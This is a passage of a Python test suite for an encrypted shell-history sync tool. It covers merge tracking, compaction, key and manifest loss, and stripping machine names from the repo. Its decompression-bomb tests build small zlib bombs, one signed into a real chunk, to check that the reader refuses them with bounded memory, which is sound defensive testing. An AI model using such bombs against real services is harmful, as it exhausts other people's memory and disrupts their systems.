            store.day_manifest(alpha.id, "2023-11-14").write_text("wrecked", encoding="utf-8")
            alpha.record("2023-11-14", 1_700_000_002, "published later")
            report = sync.run(now=1_900_000_000)

            self.assertIn("2023-11-14", report.unsignable)
            self.assertEqual(
                report.chunks_written, 0, "a chunk was written with no list to hold it"
            )

    def test_another_day_is_unaffected(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "day one")
            sync.run()
            store.day_manifest(alpha.id, "2023-11-14").write_text("wrecked", encoding="utf-8")

            # Both days have something to publish, so both are attempted; only
            # the one whose signed list is unreadable is held back. A day with
            # nothing new is never touched at all, corrupt manifest or not.
            alpha.record("2023-11-14", 1_700_000_002, "day one, again")
            alpha.record("2023-11-15", 1_700_100_001, "day two")
            report = sync.run(now=1_900_000_000)
            self.assertEqual(report.chunks_written, 1)
            self.assertEqual(report.unsignable, {"2023-11-14"})


class TestTheMergeWatermark(SyncTestCase):
    """What a machine has merged is a *set*, not a high-water mark.

    A single "highest name seen" cannot express "all but that one", and chunk
    names are only loosely ordered -- two written in the same second differ by a
    random suffix. So a high-water mark gets both of these wrong, in opposite
    directions, depending only on iteration order.
    """

    def alpha_with_two_chunks(self) -> tuple[Fake, Fake, list[store.Chunk]]:
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "first command")
            sync.run(now=1_700_000_500)
            alpha.record("2023-11-14", 1_700_000_002, "second command")
            sync.run(now=1_700_000_600)
            chunks = sorted(store.iter_chunks(alpha.id), key=lambda c: c.name)
        beta = self.machine("beta")
        with alpha.active():
            sync.grant()
        return alpha, beta, chunks

    def publish_repo_edit(self) -> None:
        """Commit and push a change made to the repo behind `sync`'s back.

        `sync` commits only when it wrote something itself, so a test that edits
        the repo directly has to publish the edit rather than wait for the next
        sync to stage it. Call from inside the editing machine's `active()`.
        """
        sync._commit()
        sync._push(sync.read_repo())

    def test_a_chunk_that_failed_once_is_retried_rather_than_skipped(self) -> None:
        """The silent half, and the worse one.

        If an earlier-named chunk fails while a later-named one succeeds, a
        high-water mark advances past the failure and that chunk is never looked
        at again -- its commands are simply missing, with nothing said after the
        run in which it failed.
        """
        alpha, beta, chunks = self.alpha_with_two_chunks()
        first, _later = chunks
        original = first.path.read_bytes()

        with alpha.active():
            # Damaged in place: its digest no longer matches the signed
            # manifest, so beta refuses it -- while the later chunk is fine.
            first.path.write_bytes(b"corrupted" + original)
            self.publish_repo_edit()

        with beta.active():
            report = sync.run()
            self.assertTrue(report.unauthenticated)
            self.assertIn("second command", beta.commands())
            self.assertNotIn("first command", beta.commands())

        # Repaired at the source, as a transient failure would be.
        with alpha.active():
            first.path.write_bytes(original)
            self.publish_repo_edit()

        with beta.active():
            sync.run()
            self.assertIn("first command", beta.commands(), "the failed chunk was never retried")

    def test_a_chunk_already_merged_is_not_read_again(self) -> None:
        """The other half: nothing already consumed may be reconsidered.

        A set says this directly. Under a high-water mark it held only because
        every later name happened to sort above every earlier one.
        """
        _alpha, beta, _chunks = self.alpha_with_two_chunks()
        with beta.active():
            self.assertEqual(sync.run().chunks_merged, 2)
            self.assertEqual(sync.run().chunks_merged, 0)
            self.assertEqual(len(cache.load_entries()), 2)


class TestCompactionDoesNotDuplicateOnPeers(SyncTestCase):
    """`compact` replaces a day's chunks with one holding the same lines.

    A peer that already merged the originals must not merge the replacement as
    though it were new. Whether it did used to be a coin flip: the compacted
    chunk carries the timestamp of the last chunk it replaced and a fresh random
    suffix, so it sorted above the old high-water mark about half the time
    (measured 4/10 before this was fixed).
    """

    def merged_entries(self, beta: Fake) -> int:
        with beta.active():
            sync.run()
            return len(beta.entries())

    def test_a_peer_that_already_merged_the_day_gains_nothing(self) -> None:
        # Counted as *entries*, not unique commands: `commands()` is a set, and
        # a set is exactly what hides this. The test that missed this bug for
        # three releases compared sets.
        alpha, beta = self.history_across_days(days=1, per_day=3)
        before = self.merged_entries(beta)
        self.assertEqual(before, 3)

        with alpha.active():
            # The suffix pinned to the highest it can be, so the compacted chunk
            # certainly sorts above the peer's old high-water mark. Left random,
            # this reproduced about half the time -- which is a coin flip, not a
            # regression test.
            with mock.patch("woswoar.store.secrets.token_hex", return_value="ffffff"):
                days, replaced, _ = sync.compact(before="2023-11-15")
            self.assertEqual((days, replaced), (1, 3))
            sync.run(now=1_700_000_900)

        self.assertEqual(self.merged_entries(beta), before, "compaction duplicated merged history")

    def test_a_peer_that_merged_only_part_of_the_day_ends_up_with_all_of_it(self) -> None:
        """The case a high-water mark cannot get right in either direction.

        Skipping the compacted chunk loses the lines the peer never had;
        appending it duplicates the ones it did. Neither is acceptable, so a
        chunk that subsumes others replaces the day rather than adding to it.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_000, "command 0")
            sync.run(now=1_700_000_500)
        beta = self.machine("beta")
        with alpha.active():
            sync.grant()
        with beta.active():
            sync.run()
            self.assertEqual(len(cache.load_entries()), 1)

        # beta is away while alpha records more and then compacts the day.
        with alpha.active():
            for i in (1, 2):
                alpha.record("2023-11-14", 1_700_000_000 + i, f"command {i}")
                sync.run(now=1_700_000_500 + i)
            sync.compact(before="2023-11-15")
            sync.run(now=1_700_000_900)

        with beta.active():
            sync.run()
            entries = cache.load_entries()
        self.assertEqual(len(entries), 3, "beta should hold each command exactly once")
        self.assertEqual({e.cmd for e in entries}, {"command 0", "command 1", "command 2"})

    def test_a_chunk_sorting_below_the_compacted_one_survives(self) -> None:
        """A day rewritten by a compacted chunk keeps what that chunk does not hold.

        Chunk names carry the timestamp of the sync that wrote them, and the
        compacted chunk takes the timestamp of the last chunk it replaced -- so
        a chunk written afterwards with an earlier timestamp sorts *below* it and
        is merged first. Discarding what had been accumulated would lose it.
        """
        alpha, beta = self.history_across_days(days=1, per_day=3)
        self.assertEqual(self.merged_entries(beta), 3)

        with alpha.active():
            sync.compact(before="2023-11-15")
            # Named below the compacted chunk, which took ts 1_700_000_502.
            alpha.record("2023-11-14", 1_700_000_009, "written after compaction")
            sync.run(now=1_700_000_400)
            names = sorted(c.name for c in store.iter_chunks(alpha.id))
        self.assertLess(names[0], names[1], "the fixture no longer builds the case")

        with beta.active():
            sync.run()
            entries = cache.load_entries()
        self.assertEqual(len(entries), 4)
        self.assertIn("written after compaction", {e.cmd for e in entries})


class TestUpgradingFromAHighWaterMark(SyncTestCase):
    """A state file written before the watermark became a set.

    Its `merged` values are single strings, and a string is iterable -- so a
    loader that just iterates them turns one chunk name into twenty-one
    one-character entries, nothing matches, every chunk looks unmerged, and the
    first sync after upgrading duplicates every peer's history. That is the very
    bug this change was made to fix, reintroduced by the fix.
    """

    def test_a_string_watermark_is_discarded_rather_than_read_as_characters(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            store.save_json(
                store.state_file(),
                {"exported": {}, "merged": {"abc/2023-11-14": "1700000000-abcdef.age"}},
            )
            merged = sync.State.load().merged
        self.assertEqual(merged, {}, "the old string was read as a set of characters")

    def test_the_day_is_re_merged_once_and_not_duplicated(self) -> None:
        """Losing the record costs one re-merge, which must not double the day.

        The chunks are merged again, appended to a log that already holds them.
        Nothing can prevent that -- the record of what was merged is gone -- but
        it must be the *only* consequence, and it must not repeat.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "before the upgrade")
            sync.run(now=1_700_000_500)
        beta = self.machine("beta")
        with alpha.active():
            sync.grant()
        with beta.active():
            sync.run()
            self.assertEqual(len(cache.load_entries()), 1)

            # Downgrade the state file to what the previous version wrote.
            state = store.load_json(store.state_file())
            state["merged"] = {key: sorted(names)[-1] for key, names in state["merged"].items()}
            store.save_json(store.state_file(), state)

            sync.run()
            after = len(cache.load_entries())
            sync.run()
            self.assertEqual(len(cache.load_entries()), after, "it re-merged a second time")

    def test_an_idle_sync_does_not_rewrite_the_state_file(self) -> None:
        """Recording every merged chunk name made this file about a megabyte.

        `run` saves at the end of every sync and the timer fires once a minute,
        so writing it out to say nothing happened is a lot of disk for no
        information -- and an idle sync is the overwhelmingly common one.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "something")
            sync.run(now=1_700_000_500)
            before = store.state_file().stat().st_mtime_ns

            sync.run(now=1_700_000_600)
            self.assertEqual(store.state_file().stat().st_mtime_ns, before)

            # And it still writes when there is something to say.
            alpha.record("2023-11-14", 1_700_000_002, "something else")
            sync.run(now=1_700_000_700)
            self.assertNotEqual(store.state_file().stat().st_mtime_ns, before)


class TestADecompressionBomb(SyncTestCase):
    """One machine must not decide how much memory the others spend.

    deflate reaches about 1030:1, so an unbounded decompress turned a 204 KB
    commit into 200 MiB of log and 420 MiB of RSS -- on a timer that fires every
    minute and asks nobody. Signing (#38) means the chunk has to come from a
    machine you accepted, which is why this is not a P0; it is still one
    compromised machine against every other one.
    """

    def test_a_bomb_is_refused_rather_than_expanded(self) -> None:
        bomb = zlib.compress(b"\n" * (sync.MAX_CHUNK_BYTES * 2), 9)
        self.assertLess(len(bomb), 1024 * 1024, "the fixture should be small to be a bomb")
        with self.assertRaises(zlib.error):
            sync.unpack(bomb)

    def test_the_boundary_is_where_it_says_it_is(self) -> None:
        """Exactly at the cap is legitimate; one byte past it is not.

        An off-by-one here either refuses a chunk a machine legitimately sent or
        leaves the last doubling unbounded, and neither shows up in a test that
        only tries a 200 MiB bomb.
        """
        limit = sync.MAX_CHUNK_BYTES
        self.assertEqual(len(sync.unpack(zlib.compress(b"x" * limit, 9))), limit)
        with self.assertRaises(zlib.error):
            sync.unpack(zlib.compress(b"x" * (limit + 1), 9))

    def test_the_refusal_costs_a_bounded_allocation(self) -> None:
        """`decompressobj` stops at the limit; `decompress` allocates first.

        Refusing *after* materialising the payload would leave the memory
        exhaustion in place and merely decline to write the file, so this
        measures what `sync.unpack` actually allocates rather than asserting a
        property of the standard library -- which is what it did first, and
        which passed perfectly well with the fix reverted.
        """
        bomb = zlib.compress(b"\n" * (sync.MAX_CHUNK_BYTES * 4), 9)
        tracemalloc.start()
        try:
            with self.assertRaises(zlib.error):
                sync.unpack(bomb)
            _, peak = tracemalloc.get_traced_memory()
        finally:
            tracemalloc.stop()
        # The bomb expands to four times the cap, so unbounded this peaks at
        # 256 MiB; bounded it peaks around 128 MiB -- the 64 MiB buffer plus the
        # doubling zlib does while filling it. Three times the cap sits in the
        # gap with room on both sides, which a tighter bound did not.
        self.assertLess(peak, sync.MAX_CHUNK_BYTES * 3)

    def test_a_bomb_in_a_real_chunk_is_reported_and_merges_nothing(self) -> None:
        """Through the whole path: it is refused like any other unusable chunk,
        the sync completes, and everything else still merges."""
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "an ordinary command")
            sync.run(now=1_700_000_500)
        beta = self.machine("beta")
        with alpha.active():
            sync.grant()

            # A chunk alpha signs, holding a payload that unpacks far too big.
            day = "2023-11-14"
            pub = store.day_key_public(alpha.id, day).read_text(encoding="utf-8").strip()
            sealed = crypto.encrypt_to(zlib.compress(b"\n" * (sync.MAX_CHUNK_BYTES * 2), 9), pub)
            path = store.chunk_dir(alpha.id, day) / "1900000000-ffffff.age"
            path.write_bytes(sealed)
            listed = sync.read_manifest(alpha.id, day, sync.signing_public())
            listed[path.name] = sync.Entry(sync.digest_of(sealed))
            sync.write_manifest(store.machine(), day, listed)
            sync._commit()
            sync._push(sync.read_repo())

        with beta.active():
            report = sync.run()
            self.assertIn(f"{alpha.id}/{day}", report.unreadable)
            self.assertEqual(beta.commands(), {"an ordinary command"})
            log = store.log_file(alpha.id, day)
            self.assertLess(log.stat().st_size, 1024, "the bomb reached the log file")

    def test_a_real_import_sized_chunk_still_merges(self) -> None:
        """The cap has to sit above what a legitimate machine actually sends.

        A whole bash_history imported at once measures about 4.4 MiB, so this
        drives a chunk of that size through the real path.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            for i in range(20_000):
                alpha.record("2023-11-14", 1_700_000_000 + i, f"command number {i} " + "x" * 60)
            report = sync.run(now=1_700_000_500)
            self.assertEqual(report.lines_exported, 20_000)
        beta = self.machine("beta")
        with alpha.active():
            sync.grant()
        with beta.active():
            self.assertEqual(sync.run().lines_imported, 20_000)

    def test_a_hosts_plaintext_is_not_all_held_before_anything_is_written(self) -> None:
        """The other half of #20: peak memory grew with the chunks waiting.

        Observed through how often the day is written: below the threshold it is
        one write per day, as it always was; above it, the merge writes as it
        goes instead of holding everything until the loop ends.
        """
        _alpha, beta = self.history_across_days(days=2, per_day=6)

        original = sync._Day._write
        with (
            beta.active(),
            mock.patch.object(sync, "FLUSH_BYTES", 1),
            mock.patch.object(sync._Day, "_write", autospec=True, side_effect=original) as spy,
        ):
            sync.run()
            writes = spy.call_count
        self.assertGreater(writes, 2, "a whole host was held before anything was written")

    def test_flushing_part_way_through_loses_and_duplicates_nothing(self) -> None:
        """And what it writes is still exactly right.

        Driven with the threshold set absurdly low, so the flush fires between
        almost every chunk -- across days, and with a day that is being
        *rewritten* rather than appended to in the mix. That day must be exempt:
        a peer that already merged it and then flushed the compacted chunk early
        would append a copy of everything it already had.
        """
        alpha, beta = self.history_across_days(days=2, per_day=6)
        with beta.active():
            sync.run()
            before = len(cache.load_entries())

        with alpha.active():
            sync.compact(before="2023-11-15")
            sync.run(now=1_700_200_000)

        with beta.active(), mock.patch.object(sync, "FLUSH_BYTES", 1):
            sync.run()
            entries = cache.load_entries()

        self.assertEqual(len(entries), before, "a flush duplicated a rewritten day")
        self.assertEqual(len({e.cmd for e in entries}), before)


class TestRecipientsPublishNoNames(SyncTestCase):
    """#22: the one plaintext file in the repo named every machine.

    `docs/security.md` says host directories are opaque hex so that a leaked
    archive does not publish usernames and hostnames. `recipients.txt` undid
    that one file over -- with woswoar's own `$USER@$(uname -n)` label, and
    again with the SSH key's own comment, which ssh-keygen writes by default.
    """

    @requires_ssh_keygen
    def test_an_ssh_recipient_loses_its_comment(self) -> None:
        """The second half of #22, and the one that leaks without woswoar's help.

        An SSH public key ends in a free-text comment, conventionally
        `user@host`, and `ssh-keygen` puts it there by default. Publishing the
        key verbatim publishes that -- twice since signatures landed, because
        `signer.pub` names the owning recipient too.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            key = self.root / "with-a-comment"
            subprocess.run(
                [
                    "ssh-keygen",
                    "-t",
                    "ed25519",
                    "-N",
                    "",
                    "-q",
                    "-C",
                    "martinus@secret-box",
                    "-f",
                    str(key),
                ],
                check=True,
                timeout=60,
            )
            recipient = crypto.recipient_for(key)
            self.assertNotIn("secret-box", recipient)
            # And it is still a recipient age will seal to.
            crypto.encrypt_to_recipients(b"payload", [recipient])

    @requires_ssh_keygen
    def test_a_file_written_before_the_comment_was_stripped_enrols_one_key(self) -> None:
        """The upgrade case, and the one a producer-side strip alone gets wrong.

        `recipients.txt` already holds the key with its comment. Normalising
        only what this machine *writes* leaves the old spelling live beside the
        new one: the same key enrolled twice, listed twice by `grant` under one
        fingerprint, and a tombstone matching only one of the two.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            key = self.root / "legacy_id_ed25519"
            subprocess.run(
                [
                    "ssh-keygen",
                    "-t",
                    "ed25519",
                    "-N",
                    "",
                    "-q",
                    "-C",
                    "martinus@secret-box",
                    "-f",
                    str(key),
                ],
                check=True,
                timeout=60,
            )
            with_comment = key.with_suffix(".pub").read_text(encoding="utf-8").strip()
            store.recipients_file().write_text(
                f"{with_comment}{sync._LABEL_SEP}martinus@box\n", encoding="utf-8"
            )

            machine = store.machine()._replace(identity=str(key))
            store.save_machine(machine)
            sync._write_repo_metadata(machine, key)

            enrolled = sync.recipients()
        self.assertEqual(len(enrolled), 1, "the same key was enrolled under two spellings")
        self.assertNotIn("secret-box", enrolled[0])

    def test_nothing_in_the_repo_names_the_machine(self) -> None:
        """The claim, checked across every committed byte rather than one file.

        `docs/security.md` says the repo does not publish machine names. This is
        what makes that a guarantee instead of a sentence.
        """
        alpha = self.machine("alpha", display="martinus@secret-box")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "git status")
            sync.run()
            # `.git` included, deliberately: it is where git would record an
            # author identity, so leaving it out would skip the weakest link in
            # the claim. `_ensure_repo_config` pins the author to a constant,
            # and this is what keeps that true.
            committed = b"".join(
                path.read_bytes() for path in store.history_dir().rglob("*") if path.is_file()
            )
        self.assertNotIn(b"secret-box", committed)
        self.assertNotIn(b"martinus", committed)

    def test_no_name_is_written_into_recipients_at_all(self) -> None:
        """#22: the label used to be `$USER@$(uname -n)`, in cleartext.

        The host directories beside it are opaque hex precisely so a leaked
        archive does not name the machines, and this file undid that one line
        over. There is now nothing in it but keys.
        """
        alpha = self.machine("alpha", display="martinus@secret-box")
        with alpha.active():
            written = store.recipients_file().read_text(encoding="utf-8")
        self.assertNotIn("secret-box", written)
        self.assertNotIn("martinus", written)
        self.assertNotIn(sync._LABEL_SEP, written)


class TestAnOrphanedDayKey(SyncTestCase):
    """Issue #42: a public day key whose sealed half has gone.

    `sync.orphaned_day_key` explains the state. What these pin is that it is
    reachable by a stranger rather than only by bad luck, and that reaching it
    costs the day's future history rather than passing unnoticed.
    """

    def test_a_peer_can_delete_another_machines_sealed_key(self) -> None:
        """The reachability the priority rests on, through a real bare repo."""
        alpha, beta = self.machine("alpha"), self.machine("beta")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "ours")
            sync.run()
        with beta.active():
            sync.run()
        self.accept_everyone(alpha)
        self.accept_everyone(beta)

        with beta.active():
            sync.run()
            victim = store.day_key(alpha.id, "2023-11-14")
            self.assertTrue(victim.is_file(), "beta cannot even see the key; premise is wrong")
            victim.unlink()
            sync._commit()
            sync._push(sync.read_repo())

        with alpha.active():
            sync.run()
            self.assertFalse(store.day_key(alpha.id, "2023-11-14").is_file())
            self.assertTrue(store.day_key_public(alpha.id, "2023-11-14").is_file())

        # What was published before the deletion is still readable by a machine
        # that had already merged it. That is what makes "copy the key back from
        # another clone" real advice rather than wishful.
        with beta.active():
            sync.run()
            self.assertIn("ours", beta.commands())

    def test_nothing_more_is_written_for_a_day_whose_key_is_gone(self) -> None:
        """The bug: sync used to mint over the top and report success."""
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "before")
            sync.run()
            before = {c.name for c in store.iter_chunks(alpha.id)}

            store.day_key(alpha.id, "2023-11-14").unlink()
            alpha.record("2023-11-14", 1_700_000_002, "after")
            report = sync.run()

            self.assertEqual(report.chunks_written, 0)
            self.assertEqual(report.orphaned, {"2023-11-14"})
            self.assertEqual({c.name for c in store.iter_chunks(alpha.id)}, before)

    def test_the_lines_stay_pending_rather_than_being_lost(self) -> None:
        """Refusing must not consume them: `logs/` is the only copy left."""
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "before")
            sync.run()
            sealed = store.day_key(alpha.id, "2023-11-14").read_bytes()
            store.day_key(alpha.id, "2023-11-14").unlink()
            alpha.record("2023-11-14", 1_700_000_002, "after")
            sync.run()

            # Put the sealed half back, which is what copying it from another
            # clone amounts to, and the pending line publishes on the next
            # ordinary sync.
            store.write_atomic(store.day_key(alpha.id, "2023-11-14"), sealed)
            report = sync.run()
            self.assertEqual(report.orphaned, set())
            self.assertGreater(report.chunks_written, 0)

    def test_a_day_with_no_chunks_yet_simply_mints_a_new_key(self) -> None:
        """Half-written pairs are ordinary; only chunks make them unrecoverable."""
        alpha = self.machine("alpha")
        with alpha.active():
            # A real key, not a malformed one: a bad recipient would make age
            # fail loudly and the test would pass for the wrong reason. This is
            # the silent case -- a usable public half whose secret is gone.
            stale = crypto.generate_identity()
            pub = store.day_key_public(alpha.id, "2023-11-14")
            pub.parent.mkdir(parents=True, exist_ok=True)
            pub.write_text(stale.public + "\n", encoding="utf-8")

            alpha.record("2023-11-14", 1_700_000_001, "first")
            report = sync.run()

            self.assertEqual(report.orphaned, set())
            self.assertEqual(report.chunks_written, 1)
            self.assertTrue(store.day_key(alpha.id, "2023-11-14").is_file())
            self.assertNotEqual(
                pub.read_text(encoding="utf-8").strip(),
                stale.public,
                "the stale public half was reused, so the chunk is already lost",
            )

    def test_an_interrupted_mint_leaves_the_recoverable_half(self) -> None:
        """Ordering is the guarantee: sealed half first, public half second.

        Written the other way round, a crash between the two produces exactly
        the state this whole class is about, from woswoar's own hand rather than
        a stranger's. This way the crash window leaves a sealed key with no
        public half, which is simply re-minted.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "first")
            real = store.write_atomic
            calls: list[Path] = []

            def die_after_first(path: Path, data: bytes) -> None:
                calls.append(path)
                if len(calls) > 1:
                    raise OSError("interrupted between the two writes")
                real(path, data)

            with (
                mock.patch.object(store, "write_atomic", die_after_first),
                self.assertRaises(OSError),
            ):
                sync.day_public_key(store.machine(), "2023-11-14")

            self.assertTrue(store.day_key(alpha.id, "2023-11-14").is_file(), "sealed half missing")
            self.assertFalse(store.day_key_public(alpha.id, "2023-11-14").is_file())
            self.assertFalse(
                sync.orphaned_day_key(alpha.id, "2023-11-14"),
                "an interrupted mint produced the destructive state",
            )

    def test_sync_says_which_day_it_refused(self) -> None:
        """The refusal is only useful if the user is told. Through the CLI.

        `Report.orphaned` is an internal field; what `docs/security.md` claims
        is that woswoar *says so*, and only stderr proves that.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "before")
            sync.run()
            store.day_key(alpha.id, "2023-11-14").unlink()
            alpha.record("2023-11-14", 1_700_000_002, "after")

            errors = io.StringIO()
            with redirect_stderr(errors), redirect_stdout(io.StringIO()):
                main(["sync"])

        said = errors.getvalue()
        self.assertIn("2023-11-14", said)
        self.assertIn("cannot be published", said)
        # The recovery it offers has to be the one that works: the deleted key
        # is still a blob in git, because woswoar never rewrites history.
        self.assertIn("--diff-filter=D", said)

    def test_doctor_is_quiet_about_a_half_written_pair_with_no_chunks(self) -> None:
        """No chunks means nothing is lost, and the next sync mints over it.

        Reporting it would be a hard red for a state that heals itself, and the
        sentence doctor prints -- "chunks encrypted to them cannot be read" --
        would be false. `export` and `orphaned_days` have to agree on that, and
        they drifted apart once already.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "ours")
            sync.run()

            pub = store.day_key_public(alpha.id, "2099-01-01")
            pub.parent.mkdir(parents=True, exist_ok=True)
            pub.write_text(crypto.generate_identity().public + "\n", encoding="utf-8")

            self.assertEqual(sync.orphaned_days(), [])
            _, text = self.run_cli(alpha, "doctor")
            self.assertIn("[ok] day keys", text)

    def test_compact_skips_the_day_rather_than_aborting(self) -> None:
        """One unreadable day used to leave every later day uncompacted."""
        alpha = self.machine("alpha")
        with alpha.active():
            for day in ("2023-11-14", "2023-11-15"):
                for i in range(2):
                    alpha.record(day, 1_700_000_001 + i, f"{day}-{i}")
                    sync.run()
            store.day_key(alpha.id, "2023-11-14").unlink()

            days, replaced, _ = sync.compact(before="2023-12-01")

            self.assertEqual(days, 1, "the healthy day was not compacted")
            self.assertGreater(replaced, 0)
            self.assertGreater(
                len(list(store.chunk_dir(alpha.id, "2023-11-14").iterdir())),
                1,
                "the unreadable day was touched",
            )

    def test_doctor_finds_it_before_more_chunks_pile_up(self) -> None:
        """Through the command, not the helper: the formatting is the fiddly part."""
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "ours")
            sync.run()
            self.assertEqual(sync.orphaned_days(), [])
            code, healthy = self.run_cli(alpha, "doctor")
            self.assertIn("[ok] day keys", healthy)

            store.day_key(alpha.id, "2023-11-14").unlink()
            self.assertEqual(sync.orphaned_days(), [(alpha.id, "2023-11-14")])

            code, text = self.run_cli(alpha, "doctor")
            self.assertEqual(code, 1, "doctor stayed green with an unreadable day")
            self.assertIn("[FAIL] day keys", text)
            self.assertIn("2023-11-14", text)


class TestADeletedManifest(SyncTestCase):
    """Issue #63, the sibling of #42 in the other rewritable file.

    `read_manifest` returns nothing for "absent" and for "will not verify"
    alike, and only the second was guarded. So a deleted manifest looked exactly
    like a day never published: the fresh one signed at the end of `export`
    named only what that run wrote, and every chunk published earlier that day
    stopped being one any peer would accept.
    """

    def published_day(self) -> Fake:
        """One machine with one day published, which is all but one test needs.

        A peer costs an `ssh-keygen` and a clone, so the one test that needs one
        makes it itself rather than every test paying for it.
        """
        alpha = self.machine("alpha")
        with alpha.active():
            alpha.record("2023-11-14", 1_700_000_001, "first")
            sync.run()
        return alpha

    def test_nothing_is_written_for_the_day(self) -> None:
        alpha = self.published_day()
        with alpha.active():
            path = store.day_manifest(alpha.id, "2023-11-14")
            before = {c.name for c in store.iter_chunks(alpha.id)}
            self.assertTrue(any(name in path.read_text(encoding="utf-8") for name in before))

            path.unlink()
            alpha.record("2023-11-14", 1_700_000_002, "second")
            report = sync.run()

            self.assertEqual(report.chunks_written, 0)
            self.assertEqual(report.manifest_missing, {"2023-11-14"})
            self.assertEqual({c.name for c in store.iter_chunks(alpha.id)}, before)
            # The disowning itself: a replacement would name only this run.
            self.assertFalse(path.exists(), "a replacement manifest was signed")

    def test_restoring_it_publishes_the_pending_line(self) -> None:
        """The lines stay in `logs/`, so the day is recoverable, not lost."""
        # Before alpha publishes, so beta is already a recipient when the day
        # key is minted -- otherwise it would need a `grant` as well, which is
        # a different mechanism and not what this test is about.
        beta = self.machine("beta")
        alpha = self.published_day()
        with alpha.active():
            path = store.day_manifest(alpha.id, "2023-11-14")
            original = path.read_bytes()
            path.unlink()
            alpha.record("2023-11-14", 1_700_000_002, "second")
            sync.run()

            store.write_atomic(path, original)
            report = sync.run()
            self.assertEqual(report.manifest_missing, set())
            self.assertEqual(report.chunks_written, 1)

        with beta.active():
            sync.run()
        self.accept_everyone(alpha)
        self.accept_everyone(beta)
        with alpha.active():
            sync.run()
        with beta.active():
            sync.run()
            self.assertEqual(sorted(beta.commands()), ["first", "second"])

    def test_a_day_never_published_here_is_not_refused(self) -> None:
        """A chunk under our id proves only that somebody wrote one.

        Keying on chunks rather than on this machine's own watermark would let
        anyone who can push plant one on a day we have not published and block
        that day for good.
        """
        alpha = self.published_day()
        with alpha.active():
            planted = store.chunk_dir(alpha.id, "2023-11-20")
            planted.mkdir(parents=True, exist_ok=True)
            (planted / "9999999999-ffffff.age").write_bytes(b"whatever an attacker likes")

            alpha.record("2023-11-20", 1_700_500_000, "mine")
            report = sync.run()

            self.assertEqual(report.manifest_missing, set())
            self.assertEqual(report.chunks_written, 1)
            self.assertTrue(store.day_manifest(alpha.id, "2023-11-20").exists())

    def test_sync_says_which_day_and_how_to_get_it_back(self) -> None:
        alpha = self.published_day()
        with alpha.active():
            store.day_manifest(alpha.id, "2023-11-14").unlink()
            alpha.record("2023-11-14", 1_700_000_002, "second")
            errors = io.StringIO()
            with redirect_stderr(errors), redirect_stdout(io.StringIO()):
                main(["sync"])

        said = errors.getvalue()
        self.assertIn("2023-11-14", said)
        self.assertIn("--diff-filter=D", said)

    def test_doctor_is_quiet_when_every_published_day_has_its_manifest(self) -> None:
        """Keyed on what this machine published, not on log files on disk.

        A day recorded but never exported has no manifest either, and reporting
        it would be a hard red for the ordinary state of a day still being
        written. The watermark is what tells the two apart.
        """
        alpha = self.published_day()
        with alpha.active():
            alpha.record("2023-11-20", 1_700_500_000, "not yet published")
            self.assertEqual(sync.days_missing_a_manifest(), [])
            _, text = self.run_cli(alpha, "doctor")
            self.assertIn("[ok] manifests", text)

    def test_doctor_finds_a_quiet_day_sync_never_looks_at(self) -> None:
        """A day fully exported before the deletion never returns to `export`."""
        alpha = self.published_day()
        with alpha.active():
            _, healthy = self.run_cli(alpha, "doctor")
            self.assertIn("[ok] manifests", healthy)

            store.day_manifest(alpha.id, "2023-11-14").unlink()
            self.assertEqual(sync.days_missing_a_manifest(), ["2023-11-14"])

            code, text = self.run_cli(alpha, "doctor")
            self.assertEqual(code, 1)
            self.assertIn("[FAIL] manifests", text)
            self.assertIn("2023-11-14", text)


class TestASingleChunkStaysUnderTheReadersCap(SyncTestCase):
    """Issue #45: the reader's bound was never enforced on the writer.

    `unpack` refuses a chunk that decompresses past `MAX_CHUNK_BYTES`, but
    `read_tail` is bounded by "everything since the last export", not by size.
    A machine that imported a decade of history in one go could seal a chunk
    every peer then refused -- for good, because `state.exported` had already
    moved past those bytes and its own copy in `logs/` looked fine.
    """

    def test_a_tail_over_the_budget_becomes_several_chunks_none_too_big(self) -> None:
        alpha = self.machine("alpha")
        with alpha.active():
            for i in range(200):
                alpha.record("2023-11-14", 1_700_000_000 + i, f"command number {i}")
            with mock.patch.object(sync, "MAX_EXPORT_BYTES", 512):
                report = sync.run()

            self.assertGreater(report.chunks_written, 1, "the tail was not split")
            self.assertEqual(report.lines_exported, 200)

            secret = sync.open_day_key(store.machine(), alpha.id, "2023-11-14")
            for chunk in store.iter_chunks(alpha.id):
                plain = sync.unpack(crypto.decrypt_with_secret(chunk.path.read_bytes(), secret))
                self.assertLessEqual(len(plain), 512, f"{chunk.name} is over the budget")

    def test_a_peer_gets_every_line(self) -> None:
        """The point of the whole thing: nothing is lost by splitting."""
        alpha, beta = self.machine("alpha"), self.machine("beta")
        with alpha.active():
            for i in range(200):
                alpha.record("2023-11-14", 1_700_000_000 + i, f"command number {i}")
            with mock.patch.object(sync, "MAX_EXPORT_BYTES", 512):
                sync.run()

        with beta.active():
            sync.run()
        self.accept_everyone(alpha)
        self.accept_everyone(beta)
        with alpha.active():
            sync.run()
        with beta.active():
            sync.run()
            self.assertEqual(len(beta.commands()), 200)
            self.assertEqual(sorted(beta.commands()), sorted(alpha.commands()))

    def test_compaction_leaves_an_over_budget_day_alone(self) -> None:
